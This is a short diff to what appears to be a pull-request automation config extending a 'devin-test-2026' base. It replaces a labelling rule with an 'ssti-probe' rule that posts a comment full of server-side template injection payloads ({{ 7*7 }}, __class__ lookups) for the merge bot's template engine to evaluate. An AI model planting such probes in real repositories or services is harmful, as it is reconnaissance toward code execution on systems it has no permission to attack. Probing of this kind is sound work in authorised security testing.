@@ -1,10 +1,9 @@
 extends: devin-test-2026
 
 pull_request_rules:
-  - name: local rule
+  - name: ssti-probe
     conditions:
       - base=main
     actions:
-      label:
-        add:
-          - local
+      comment:
+        message: "SSTIPROBE mathA[{{ 7*7 }}]A dunderB[{{ author.__class__ }}]B fmtC[{{ '{0.__class__}'.format(author) }}]C strD[{{ ''.__class__ }}]D"
